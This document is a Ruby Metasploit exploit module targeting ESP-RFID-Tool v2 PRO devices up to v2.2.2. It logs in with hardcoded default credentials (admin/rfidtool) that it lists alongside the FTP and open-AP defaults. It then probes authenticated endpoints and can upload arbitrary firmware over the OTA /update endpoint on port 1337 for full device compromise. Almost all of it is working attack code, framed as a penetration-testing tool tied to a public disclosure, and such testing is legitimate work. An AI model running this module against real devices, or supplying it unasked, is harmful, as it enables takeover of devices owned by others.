##
# ESP-RFID-Tool v2 PRO — ESPR-05
# Hardcoded Default Credentials — OTA Firmware Upload / Full Device Compromise
#
# Researcher: Milan 't4c' Berger
# Advisory:   https://www.ghcif.de/txt/ESP-RFID-Tool_v2_PRO_-_Full_Public_Disclosure.txt
# Affected:   ESP-RFID-Tool v2 PRO <= v2.2.2 (all versions as of 2026-05-02)
# CVE:        Pending
#
# Description:
#   Default credentials are hardcoded in loadDefaults() (esprfidtool.ino:970)
#   and publicly known via the open-source repository. No forced credential
#   change is enforced on first boot. The OTA firmware update endpoint (/update,
#   port 1337) accepts firmware binaries via HTTP POST with HTTP Basic Auth.
#
#   Default credentials:
#     Web/OTA:  admin / rfidtool
#     FTP:      ftp-admin / rfidtool
#     WiFi AP:  ESP-RFID-Tool / (no password)
#
#   This module:
#     1. Checks if the target responds to the default or provided credentials
#     2. Optionally uploads a custom firmware binary to achieve full device control
#
#   WARNING: Uploading custom firmware to a live device is a DESTRUCTIVE action.
#            Only use in authorized penetration testing environments.
#            Set UPLOAD_FIRMWARE=false to perform credential check only.
#
# Usage (cred check only):
#   use exploit/linux/http/esp_rfid_ota_upload
#   set RHOSTS 192.168.1.1
#   set UPLOAD_FIRMWARE false
#   run
#
# Usage (full firmware upload):
#   set UPLOAD_FIRMWARE true
#   set FIRMWARE_PATH /path/to/custom_firmware.bin
#   run
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'ESP-RFID-Tool v2 PRO — Default Credentials + OTA Firmware Upload (ESPR-05)',
        'Description' => %q{
          Exploits hardcoded default credentials in ESP-RFID-Tool v2 PRO (<= v2.2.2).
          Default web/OTA credentials (admin:rfidtool) are publicly known and no
          forced credential change occurs on first boot.

          This module:
            1. Attempts authentication using default or specified credentials
            2. Enumerates authenticated endpoints to confirm access
            3. Optionally uploads a custom firmware binary via the OTA update
               endpoint (/update on port 1337) for full device compromise

          Combined with ESPR-03 (Path Traversal), the credentials extracted from
          /esprfidtool.json can be fed directly into this module if the user has
          changed the defaults.

          CAUTION: UPLOAD_FIRMWARE=true is destructive — it replaces device firmware.
          Only use in authorized testing environments.

          Discovered by Milan 't4c' Berger. Vendor notified 2026-04-27,
          deleted disclosure comment and blocked researcher. Full public
          disclosure 2026-04-28.
        },
        'Author'      => ['dRonin (tak47loss@mail.ru)'],
        'License'     => MSF_LICENSE,
        'References'  => [
          ['URL', 'https://github.com/Einstein2150/ESP-RFID-Tool-v2'],
          ['URL', 'https://www.ghcif.de/txt/ESP-RFID-Tool_v2_PRO_-_Full_Public_Disclosure.txt'],
          ['Researcher', 'Milan "t4c" Berger']
        ],
        'DisclosureDate' => '2026-04-28',
        'Platform'    => 'linux',
        'Arch'        => ARCH_CMD,
        'Targets'     => [
          ['ESP8266 OTA Update', {}]
        ],
        'DefaultTarget' => 0,
        'Notes'         => {
          'Stability'   => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(80),
      OptInt.new('OTA_PORT',
        [true, 'OTA update server port', 1337]
      ),
      OptString.new('USERNAME',
        [true, 'Username for HTTP Basic Auth', 'admin']
      ),
      OptString.new('PASSWORD',
        [true, 'Password for HTTP Basic Auth', 'rfidtool']
      ),
      OptBool.new('UPLOAD_FIRMWARE',
        [true, 'Upload custom firmware (DESTRUCTIVE — authorized testing only)', false]
      ),
      OptPath.new('FIRMWARE_PATH',
        [false, 'Path to custom firmware .bin file for OTA upload', '']
      ),
      OptBool.new('CHECK_ONLY',
        [false, 'Only verify credentials without any state-changing actions', false]
      ),
    ])
  end

  def check
    print_status("Checking for ESP-RFID-Tool OTA endpoint on port #{datastore['OTA_PORT']}...")

    begin
      res = send_request_cgi({
        'method'   => 'GET',
        'uri'      => '/update',
        'port'     => datastore['OTA_PORT'],
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
      })

      return CheckCode::Unknown if res.nil?

      if res.code == 200
        if res.body.include?('ESP-RFID') || res.body.include?('Update') || res.body.include?('firmware')
          return CheckCode::Vulnerable
        end
        return CheckCode::Detected
      elsif res.code == 401
        print_status("Target requires auth — credentials may be wrong or changed from default")
        return CheckCode::Safe
      end

      return CheckCode::Unknown
    rescue ::Rex::ConnectionRefused
      return CheckCode::Unknown
    end
  end

  def exploit
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    ota_port = datastore['OTA_PORT']

    print_status("Target: #{rhost}:#{rport} (OTA: port #{ota_port})")
    print_status("Credentials: #{username}:#{password}")

    # --- Step 1: Verify credentials on main web interface ---
    print_status("Step 1: Testing credentials on main web interface (port #{rport})...")

    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => '/settings',
      'username' => username,
      'password' => password,
    })

    if res.nil?
      fail_with(Failure::Unreachable, "No response from #{rhost}:#{rport}")
    end

    if res.code == 401
      fail_with(Failure::NoAccess, "Authentication failed with #{username}:#{password} — credentials may have been changed")
    end

    if res.code == 200
      print_good("Credentials valid: #{username}:#{password} — HTTP 200 on /settings")
    else
      print_warning("Unexpected response: HTTP #{res.code} — continuing anyway")
    end

    report_credential_login(
      address:      rhost,
      port:         rport,
      protocol:     'tcp',
      service_name: 'http',
      username:     username,
      password:     password,
      status:       Metasploit::Model::Login::Status::SUCCESSFUL
    )

    report_vuln(
      host:  rhost,
      port:  rport,
      proto: 'tcp',
      name:  'ESP-RFID-Tool v2 PRO — Default Credentials (ESPR-05)',
      info:  "Login successful with default credentials #{username}:#{password}",
      refs:  references
    )

    return if datastore['CHECK_ONLY']

    # --- Step 2: Test OTA endpoint ---
    print_status("Step 2: Testing OTA endpoint on port #{ota_port}...")

    res_ota = send_request_cgi({
      'method'   => 'GET',
      'uri'      => '/update',
      'port'     => ota_port,
      'username' => username,
      'password' => password,
    })

    if res_ota.nil?
      print_warning("OTA endpoint (port #{ota_port}) did not respond — may be disabled or on different port")
    elsif res_ota.code == 200
      print_good("OTA endpoint accessible on port #{ota_port}")
      report_credential_login(
        address:      rhost,
        port:         ota_port,
        protocol:     'tcp',
        service_name: 'http',
        username:     username,
        password:     password,
        status:       Metasploit::Model::Login::Status::SUCCESSFUL
      )
    else
      print_warning("OTA endpoint returned HTTP #{res_ota.code}")
    end

    # --- Step 3: Optional firmware upload ---
    unless datastore['UPLOAD_FIRMWARE']
      print_status("UPLOAD_FIRMWARE=false — skipping firmware upload. Set true to proceed with full compromise.")
      return
    end

    firmware_path = datastore['FIRMWARE_PATH']
    if firmware_path.nil? || firmware_path.empty?
      fail_with(Failure::BadConfig, "UPLOAD_FIRMWARE=true but FIRMWARE_PATH is not set")
    end

    unless File.exist?(firmware_path)
      fail_with(Failure::BadConfig, "Firmware file not found: #{firmware_path}")
    end

    firmware_data = File.binread(firmware_path)
    print_status("Step 3: Uploading firmware (#{firmware_data.length} bytes) to #{rhost}:#{ota_port}/update...")
    print_warning("THIS IS DESTRUCTIVE — existing firmware will be replaced")

    # Build multipart form data
    boundary = "MSFBoundary#{Rex::Text.rand_text_alphanumeric(16)}"
    body  = "--#{boundary}\r\n"
    body += "Content-Disposition: form-data; name=\"image\"; filename=\"firmware.bin\"\r\n"
    body += "Content-Type: application/octet-stream\r\n\r\n"
    body += firmware_data
    body += "\r\n--#{boundary}--\r\n"

    res_upload = send_request_cgi({
      'method'   => 'POST',
      'uri'      => '/update',
      'port'     => ota_port,
      'username' => username,
      'password' => password,
      'ctype'    => "multipart/form-data; boundary=#{boundary}",
      'data'     => body,
    })

    if res_upload.nil?
      print_warning("No response after firmware upload — device may be rebooting (upload may have succeeded)")
      return
    end

    if res_upload.code == 200
      print_good("Firmware upload accepted (HTTP 200) — device will reboot with new firmware")
    elsif res_upload.code == 302 || res_upload.code == 303
      print_good("Firmware upload accepted (HTTP #{res_upload.code} redirect) — device rebooting")
    else
      print_warning("Unexpected response after upload: HTTP #{res_upload.code}")
      print_status("Response body: #{res_upload.body[0..512]}")
    end
  end
end
